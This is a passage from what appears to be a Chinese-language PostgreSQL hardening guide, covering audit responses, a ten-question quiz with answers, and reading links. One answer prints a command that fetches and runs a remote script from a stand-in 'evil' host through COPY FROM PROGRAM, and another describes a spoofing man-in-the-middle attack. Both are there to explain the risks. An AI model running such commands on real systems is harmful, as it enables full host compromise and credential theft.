> 否則你交出去的稽核資料本身就是一份個資外洩。
>
> **(b) 沒裝 pgaudit 的誠實回覆**
> 只能回答「連線層級」的資訊，不能回答「撈了什麼」：
> ```bash
> sudo grep 'connection authorized' /var/log/postgresql/postgresql-17-main.log.* | grep appdb
> ```
> 回覆應寫：「本系統於 7 月僅具備連線層級軌跡（可提供連線帳號、來源 IP、
> 連線時間與時長），**尚無資料表層級之存取軌跡**，故無法確認個別資料表之查詢紀錄。
> 已於 8 月完成 pgaudit 導入，自 8 月 X 日起具備完整軌跡。」
> ★★★★★ **不要**用「應該沒有人查」或「應用有記 log」來搪塞 ——
> 應用層的 log 證明不了「有人繞過應用直接連資料庫」。
>
> **(c) 之後怎麼避免**
> 1. ★★★★ pgaudit 列入**系統上線前的檢查清單**，跟備份一樣是上線條件
> 2. 日誌**即時送 SIEM**（本機日誌在入侵時會被刪），見 [[090-05-09-guide-資安設備-日誌集中與SIEM]]
> 3. 訂定保存期限（個資相關建議至少一年）並確認 logrotate 不會提早刪掉
> 4. 設定告警：非上班時間存取 `citizens`、單次撈取超過 N 列
> 5. 把 `pg-hardening-check.sh` 排進每月巡檢，`pgaudit 已載入` 這項失敗會寄信

## 小測驗

Q1. `nmap` 顯示 5432 是 `open`，但用 psql 連過去得到 `FATAL: no pg_hba.conf entry for host …`。這台機器算不算安全？為什麼？

Q2. 你在 `postgresql.conf` 把 `listen_addresses` 從 `'*'` 改成 `'localhost'`，執行 `systemctl reload postgresql@17-main`，然後 `ss -lntp` 發現還是綁在 `0.0.0.0`。哪裡錯了？

Q3. （是非）把 `password_encryption` 設成 `scram-sha-256` 並 reload 之後，資料庫裡既有帳號的 md5 密碼會自動轉成 SCRAM。

Q4. 下面這兩行 pg_hba.conf 的順序，會造成什麼後果？
```text
host    all   all    0.0.0.0/0        md5
hostssl appdb app_rw 10.10.20.0/24    scram-sha-256
```

Q5. `sslmode=require` 與 `sslmode=verify-full` 差在哪？哪一個擋得住中間人？攻擊者具體會怎麼做？

Q6. 你安裝了 pgaudit、也執行了 `CREATE EXTENSION pgaudit;`、也在設定檔加了 `pgaudit.log = 'write'`，reload 之後日誌卻完全沒有 `AUDIT:` 字樣。該先查哪裡？

Q7. 「這行指令會發生什麼」：在一台還有 20 條 `sslmode=prefer`（實際未加密）連線的正式資料庫上，把 pg_hba 的 `host` 全部改成 `hostssl` 並 `systemctl reload`。

Q8. 應用帳號 `app_rw` 不是 superuser，但被授予了 `pg_execute_server_program`。這有什麼具體風險？

Q9. 你啟用了 RLS 並建好 policy，但應用查出來還是全部的列。最可能的兩個原因是什麼？

Q10. 稽核委員要你填寫「本資料庫已依 TWGCB-XX-XXX 完成組態設定」。你查不到 PostgreSQL 對應的 TWGCB 編號。該怎麼回覆？

> [!question]- 測驗答案
> **Q1. 不安全。★★★★**
> `open` 代表 TCP 三次握手成功、PostgreSQL 已經跟對方完成協定交握之後才拒絕。
> 攻擊者在被拒之前已經拿到：這台跑 PostgreSQL 的事實、可能的版本橫幅、
> 以及一條可以反覆重試、消耗 `max_connections` 的通道。
> 更糟的是這行錯誤訊息**主動洩露**了帳號名、資料庫名與「你沒用加密」（`no encryption`）。
> 撐住你的是一個文字設定檔，不是網路 —— 只要有人手滑編輯錯，防線就沒了。
> 唯二可接受的結果是 `Connection timed out`（filtered）或 `Connection refused`。
> 處置順序：先用防火牆白名單止血（不必重啟），再收 `listen_addresses`（要重啟）。
> 見「從外部主機驗證」那張錯誤訊息對照表。
>
> **Q2. `listen_addresses` 是 postmaster 參數，reload 不生效。★★★★**
> `pg_settings.context` 為 `postmaster` 的參數只在**伺服器啟動時**讀取，
> SIGHUP（reload）會被忽略，而且**不會有任何錯誤訊息** —— 這是最容易被誤判成「已完成」的一項。
> ```bash
> sudo -u postgres psql -Atc "SELECT name,context FROM pg_settings WHERE name='listen_addresses';"
> # listen_addresses|postmaster
> sudo systemctl restart postgresql@17-main
> ```
> ★★★★ 同類的還有 `port`、`max_connections`、`shared_preload_libraries`（pgaudit 就卡在這）。
> 判斷方式不必背，查 `pg_settings.context` 即可。
> 驗證一定要看 `ss -lntp` 的實際輸出，不要只看 `SHOW listen_addresses`（它顯示的是設定值，不是實際綁定）。
> 見「reload 還是 restart？」那張表。
>
> **Q3. 錯。★★★★**
> `password_encryption` **只決定「之後設定的密碼」用什麼雜湊**，
> 既有帳號的 `rolpassword` 完全不會動 —— 因為伺服器手上根本沒有明文密碼，無從重算。
> 必須逐一 `\password <role>`（或 `ALTER ROLE … PASSWORD '…'`）重設。
> 驗證：
> ```bash
> sudo -u postgres psql -Atc "SELECT count(*) FROM pg_authid WHERE rolpassword LIKE 'md5%';"   # 必須是 0
> ```
> ★★★★ 這個誤解會造成「以為已經遷移完成，把 pg_hba 改成 scram-sha-256，
> 結果所有沒換密碼的帳號全部被鎖死」。見「md5 遷移到 scram-sha-256」。
>
> **Q4. 第二行永遠不會被使用。★★★★★**
> pg_hba 是**第一筆命中即定案，沒有 fall-through**。
> 來源 `10.10.20.21` 的連線在比對第一行時，(type=host 涵蓋 SSL 與非 SSL、
> address=0.0.0.0/0 涵蓋所有來源、database=all、user=all) 四個條件全部命中，
> 就直接用 `md5` 認證，**不會再往下看第二行**。
> 後果是：你以為強制了 SSL 與 scram，實際上應用可以用明文 + md5 連進來，
> 而且全世界任何位址都可以嘗試。
> ★★★★ 排查方式：`SELECT rule_number, type, address, auth_method FROM pg_hba_file_rules ORDER BY rule_number;`
> 然後**用手指由上往下比對**你那條連線。見「pg_hba.conf 是第一筆命中即定案」。
>
> **Q5. `require` 只加密不驗身分，擋不住中間人。★★★★**
> - `require`：建立 TLS，但**完全不檢查伺服器憑證是誰簽的、CN/SAN 是不是你要連的主機**
> - `verify-full`：驗證憑證鏈到你指定的 `sslrootcert`，**且**比對主機名與 SAN
>
> 攻擊者的具體做法：在同網段做 ARP 欺騙（或 DNS 汙染），架一台自簽憑證的假 PostgreSQL，
> 客戶端用 `require` 連上去 —— **應用日誌一樣顯示「已加密連線」** ——
> 攻擊者拿到帳號密碼與所有查詢內容，再轉送給真伺服器讓應用正常運作，你完全不會發現。
> ★★★★ 加密解決竊聽，驗證解決冒充；只做前者等於只做一半。
> 加上 `channel_binding=require` 可以再擋一層轉送式攻擊。
> 見「分階段切成強制加密」的 sslmode 對照表。
>
> **Q6. 先查 `shared_preload_libraries`。★★★★**
> pgaudit 是掛在伺服器啟動流程裡的 hook，必須由 postmaster 預先載入：
> ```bash
> sudo -u postgres psql -Atc "SHOW shared_preload_libraries;"
> ```
> 如果輸出是空的或不含 `pgaudit`，就是 `shared_preload_libraries` 這個
> **postmaster 參數只 reload 沒有 restart**。
> ```bash
> sudo systemctl restart postgresql@17-main
> ```
> ★★★ 第二個要查的是 `pgaudit.log` 的值有沒有涵蓋你做的動作
> （設 `'write'` 就記不到 `SELECT`，要記讀取得加 `read`）。
> 第三個是 `pgaudit.log_catalog`（若你測試時只跑了 `\d`，關掉 catalog 就不會有紀錄）。
> 見「第二層：pgaudit」。
>
> **Q7. 那 20 條連線**不會斷**，但它們的下一次重連會全部失敗。★★★★★**
> `pg_hba.conf` 只在**建立新連線時**比對，reload 不會踢掉既有連線。
> 所以現象是「reload 當下看起來一切正常」，然後隨著連線池回收、應用重啟、
> 批次作業啟動，錯誤**陸續**出現：
> `FATAL: no pg_hba.conf entry for host "10.10.20.21", user "app_rw", database "appdb", no encryption`。
> ★★★★★ 這種「延遲爆炸」比立刻中斷更難排查，因為你已經離開現場了。
> 正確做法：切之前先確認 `SELECT count(*) FROM pg_stat_ssl WHERE ssl=false` 為 0，
> 而且要**觀察一個完整營運日**（含月結、夜間批次、備份作業這些一天只跑一次的連線）。
> 止血：`cp` 回備份的 pg_hba.conf 再 reload。見「分階段切成強制加密」的階段 3。
>
> **Q8. 等於把主機 shell 交給任何能對 `app_rw` 做 SQL 注入的人。★★★★★**
> 有這個角色就能執行：
> ```sql
> COPY t FROM PROGRAM 'curl http://evil/x.sh | sh';
> ```
> 指令會**以 `postgres` 這個 OS 帳號執行**，可以讀寫資料目錄、寫入
> `~postgres/.ssh/authorized_keys`、往內網橫向移動。
> 也就是說，一個原本只是「可能撈到資料」的 SQL 注入漏洞，直接升級成「整台主機淪陷」。
> 檢查：
> ```bash
> sudo -u postgres psql -Atc "SELECT m.rolname FROM pg_auth_members am
>   JOIN pg_roles r ON r.oid=am.roleid JOIN pg_roles m ON m.oid=am.member
>   WHERE r.rolname='pg_execute_server_program';"   # 必須沒有輸出
> ```
> ★★★★★ 同等級的還有 `pg_write_server_files` 與 superuser 屬性。見「收斂授權」。
>
> **Q9. (a) 應用帳號是表的擁有者；(b) 應用帳號有 superuser 或 BYPASSRLS。★★★★**
> RLS 有三種身分會被繞過：superuser（永遠繞過，不可關閉）、
> 有 `BYPASSRLS` 屬性的角色、以及**表的擁有者**（這一個最常中）。
> ```sql
> ALTER TABLE cases FORCE ROW LEVEL SECURITY;   -- 讓擁有者也受 policy 約束
> ```
> ```bash
> sudo -u postgres psql -d appdb -Atc "SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname='app_rw';"
> # 期望：f|f
> sudo -u postgres psql -d appdb -Atc "SELECT tableowner FROM pg_tables WHERE tablename='cases';"
> # 期望：schema_owner，不是 app_rw
> ```
> ★★★ 第三個可能（較少見）是 policy 的 `USING` 條件用了
> `current_setting('app.dept_code', true)`，而應用忘了每次連線 `SET`，
> 導致條件為 NULL —— 此時 policy 會過濾掉**全部**的列而不是全部放行，症狀相反。
> 見「敏感欄位：RLS 與欄位級權限」。
>
> **Q10. 誠實寫「目前無對應之 TWGCB 資料庫基準」，並提出替代依據。★★★★★**
> TWGCB 目前公布的 Linux 基準是**作業系統層級**的（如 TWGCB-01-014 Ubuntu 22.04）。
> ★★★★★ **編一個「PostgreSQL 的 TWGCB 編號」填上去，是在稽核文件上造假**，
> 後果比「有缺失」嚴重得多。
> 正確回覆的三段式：
> 1. 主機層面依實際適用的 TWGCB Linux 基準（填真實編號與版本）完成組態，附檢測報告
> 2. 資料庫層面目前無對應之 TWGCB 基準，故參採 CIS PostgreSQL Benchmark 與
>    PostgreSQL 官方安全指引，自訂 21 項檢核
> 3. 附上 `pg-hardening-check.sh` 的整改前後輸出與每月巡檢排程作為佐證
>
> ★★★ 動筆前先到 <https://www.nccst.nat.gov.tw/GCB> 確認當下有沒有新增資料庫類基準。
> 見「TWGCB 對應：誠實的說法」與 [[090-06-01-guide-TWGCB-TWGCB概念與法規要求]]。

## 延伸閱讀

- [[060-04-02-04-svc-PostgreSQL-設定檔與pg_hba]] — ★★★★ 本篇的地基。pg_hba 的欄位語法、比對順序、`include_dir`、reload 與 restart 的完整分界
- [[060-04-02-02-cmd-PostgreSQL-角色與權限]] — `GRANT` / `REVOKE` / `ALTER DEFAULT PRIVILEGES` 的完整模型；本篇只做盤點與收斂
- [[060-04-02-05-svc-PostgreSQL-備份與還原]] — 備份加密、保存期限與 PITR **還原演練**；本篇第 6 層（靜態資料）靠它落實
- [[060-04-02-07-svc-PostgreSQL-複寫與高可用]] — 複寫帳號與 `replication` 連線的建置，本篇補了憑證認證那一段
- [[060-04-01-07-svc-MySQL-安全強化]] — 同一件事在 MySQL 怎麼做，對照著看最快建立差異感（尤其是稽核與 TDE 兩塊完全相反）
- [[090-01-08-guide-PKI-用自建CA簽發伺服器憑證]] — 本篇用到的資料庫憑證從哪來；[[090-01-10-guide-PKI-憑證部署到各服務]] 講同一張 CA 怎麼同時服務 Nginx 與資料庫
- [[090-01-12-guide-PKI-憑證生命週期管理]] — 憑證到期前的輪替流程（★★★ 資料庫憑證輪替只要 reload，不必停機）
- [[090-08-05-guide-Wazuh-日誌蒐集與解析]] — 把 `connection authorized` 與 `AUDIT:` 變成會告警的規則
- [[090-07-07-guide-資安實踐-台灣資安法規與個資法]] — 個資盤點、通報時限與委外管理的法規面
- [[090-07-09-guide-資安實踐-資安稽核與符合性檢核]] — 把本篇的健檢輸出組織成一份完整的符合性報告
- [[090-03-04-guide-應用安全-備份災難復原與入侵應變]] — 資料庫被拖庫或勒索後的應變順序
- PostgreSQL 17 — Client Authentication（pg_hba.conf）：<https://www.postgresql.org/docs/17/client-authentication.html>
- PostgreSQL 17 — Secure TCP/IP Connections with SSL：<https://www.postgresql.org/docs/17/ssl-tcp.html>
- pgaudit 官方專案（版本相容表與參數說明）：<https://github.com/pgaudit/pgaudit>
- 政府組態基準（GCB）專區：<https://www.nccst.nat.gov.tw/GCB>
